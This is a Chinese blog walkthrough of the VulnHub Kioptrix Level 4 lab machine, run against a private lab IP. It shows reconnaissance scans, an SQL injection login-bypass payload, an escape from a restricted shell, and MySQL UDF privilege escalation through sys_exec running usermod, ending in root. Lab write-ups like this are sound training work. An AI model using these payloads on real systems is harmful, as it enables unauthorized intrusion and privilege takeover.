
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/GuijiH6/p/18732169" title="发布于 2025-02-23 15:12">
    <span role="heading" aria-level="2">Vulnhun靶机-kioptix level 4-sql注入万能密码拿到权限ssh连接利用mysql-udf漏洞提权</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="一环境搭建">一、环境搭建</h1>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250218203956453.png" alt="" loading="lazy"></p>
<p>然后选择靶机所在文件夹</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250220165758275.png" alt="" loading="lazy"></p>
<h1 id="信息收集">信息收集</h1>
<p>本靶机ip和攻击机ip</p>
<pre><code class="language-php">攻击机：192.168.108.130
靶机：192.168.108.141  
</code></pre>
<h2 id="扫描ip">扫描ip</h2>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250220225137595.png" alt="" loading="lazy"></p>
<p>靶机ip为：<strong>192.168.108.141</strong></p>
<h2 id="扫描开放端口">扫描开放端口</h2>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250220225257580.png" alt="" loading="lazy"></p>
<p>可用信息</p>
<pre><code class="language-php">22/tcp  open  ssh                
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
</code></pre>
<h2 id="扫描版本服务信息">扫描版本服务信息</h2>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250220225328063.png" alt="" loading="lazy"></p>
<p>可用信息</p>
<pre><code class="language-php">//端口        //应用层协议     //详细信息
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0) //操作系统ubuntu
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
</code></pre>
<h2 id="指纹探测">指纹探测</h2>
<pre><code class="language-php">nmap 192.168.108.141 -p 22,80,139,445 -sV -sC -O --version-all 
</code></pre>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250220225600888.png" alt="" loading="lazy"></p>
<p>可用信息：</p>
<pre><code class="language-php">Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Samba smbd 3.0.28a
</code></pre>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250222172408628.png" alt="" loading="lazy"></p>
<h2 id="目录扫描">目录扫描</h2>
<pre><code class="language-bash">dirsearch -u http://192.168.108.141 -e*
dirb http://192.168.108.141
</code></pre>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250222175102218.png" alt="" loading="lazy"></p>
<p>可用信息：</p>
<pre><code class="language-php">http://192.168.108.141/images/                 //图片
http://192.168.108.141/checklogin.php          //检测登录情况
http://192.168.108.141/database.sql            //数据库文件
http://192.168.108.141/index.php               //主页面                                                                                                                
http://192.168.108.141/john/                   //用户john                                                                                                                      
http://192.168.108.141/logout                  //登出                                                                                                              
http://192.168.108.141/member                  //用户个人空间                                                                                                              
http://192.168.108.141/server-status          //常见的用于监控和获取 Web 服务器状态的文件或页面
</code></pre>
<h1 id="二web渗透">二、Web渗透</h1>
<p>访问80端口，一个登录框，尝试弱口令无果</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250223150300124.png" alt="" loading="lazy"></p>
<p>根据信息收集的东西，访问<strong>database.sql</strong>页面，有三个传参点，id，username，password，以及一个可能是用户名和密码的消息</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250222175649527.png" alt="image-20250222175649475" loading="lazy"></p>
<p>尝试后发现不对</p>
<h2 id="sql注入">sql注入</h2>
<p>密码处报错，存在注入</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250222180956106.png" alt="" loading="lazy"></p>
<p>利用万能密码尝试</p>
<pre><code class="language-bash">1' or true-- -  #'将sql语句注释 or ture 添加永真条件 -- -：注释掉后面的 SQL 代码，防止其执行
</code></pre>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250222181459759.png" alt="" loading="lazy"></p>
<p>登录查看，发现这是<strong>member</strong>的页面，查看源码并未有什么有用消息</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250222181727675.png" alt="" loading="lazy"></p>
<h1 id="三提权">三、提权</h1>
<p>拿到了账号密码就可以使用<strong>ssh连接</strong>，这里使用<strong>-o HostKeyAlgorithms=+ssh-rsa</strong>算法连接，因为靶机只支持该算法</p>
<pre><code class="language-bash">ssh -o HostKeyAlgorithms=+ssh-rsa john@192.168.108.141
</code></pre>
<p>成功登录之后发现让我们输入help或？，输入看看，回显了一部分命令，看来是我们只能使用这些命令进行操作，这里可能需要使用shell逃逸，即绕过安全限制</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250222182556067.png" alt="image-20250222182555966" loading="lazy"></p>
<p>可用命令如下</p>
<pre><code class="language-bash">cd  clear  echo  exit  help  ll  lpath  ls
</code></pre>
<p>找找可用信息，可用看到我们是john用户，有几个可疑文件<strong>.bash_history<code>、</code>.bash_logout<code>和</code>.lhistory</strong></p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250223135038026.png" alt="" loading="lazy"></p>
<p>查看当前SHELL变量，使用echo $SHELL</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250223141513330.png" alt="" loading="lazy"></p>
<p>成功切换shell，查看当前进程，发现mysql是以root权限进行的</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250223142648144.png" alt="" loading="lazy"></p>
<h2 id="udf提权">UDF提权</h2>
<p>这里我们可用使用<strong>UDF提权</strong></p>
<pre><code class="language-bash">在 MySQL 中，UDF（User Defined Function，用户定义函数）提权是一种利用用户定义函数的漏洞或特性来提升权限的攻击手段。攻击者可以通过创建恶意的用户定义函数来执行任意代码，从而获得更高的权限，甚至可能完全控制数据库服务器
</code></pre>
<p>查找先前收集的php信息</p>
<pre><code class="language-bash">find / -name *.php 2&gt; /dev/null  #2&gt; /dev/null的意思是将错误信息全部丢弃，/dev/null是一个特殊设备文件，任何写入的设备都会被丢弃
</code></pre>
<p>查看一下登录检测页面，发现mysql密码为空，也是挺抽象</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250223143534651.png" alt="" loading="lazy"></p>
<p>连接mysql，成功连接</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250223143943348.png" alt="" loading="lazy"></p>
<p>查看数据库和数据表，有一个可疑文件</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250223144504962.png" alt="" loading="lazy"></p>
<p>看看该表</p>
<pre><code class="language-bash">select * from 'func';
</code></pre>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250223144636188.png" alt="" loading="lazy"></p>
<h2 id="修改权限">修改权限</h2>
<p>发现一个<strong>sys_exec</strong>函数，<code>sys_exec</code> 函数是一个用户定义函数（UDF），它允许执行系统命令并返回命令的输出。这个函数并不是 MySQL 的内置函数，而是通过安装特定的 UDF 扩展来实现的。</p>
<p>修改<strong>john</strong>为管理员</p>
<pre><code class="language-bash">select sys_exec('usermod -a -G admin john');
</code></pre>
<p>看看参数的意思</p>
<ul>
<li><code>usermod</code> 是一个 Linux 命令，用于修改用户账户的属性。</li>
<li><code>-a</code> 选项表示将用户添加到指定的组，而不从其他组中删除。</li>
<li><code>-G admin</code> 指定要将用户添加到的组，这里是 <code>admin</code> 组。</li>
<li><code>john</code> 是要修改的用户名。</li>
</ul>
<p>exit退出mysql，输入<strong>sudo -i</strong>即可拿到root权限</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250223145835887.png" alt="" loading="lazy"></p>
<p>这里看看两中切换管理员命令的区别</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250223150046718.png" alt="" loading="lazy"></p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.046153510775462966" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2025-02-23 15:12">2025-02-23 15:12</span>&nbsp;
<a href="https://www.cnblogs.com/GuijiH6">H轨迹H</a>&nbsp;
阅读(<span id="post_view_count">0</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
<a href="https://i.cnblogs.com/EditPosts.aspx?postid=18732169" rel="nofollow">编辑</a>&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18732169);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18732169', targetLink: 'https://www.cnblogs.com/GuijiH6/p/18732169', title: 'Vulnhun靶机-kioptix level 4-sql注入万能密码拿到权限ssh连接利用mysql-udf漏洞提权' })">举报</a>
</div>
        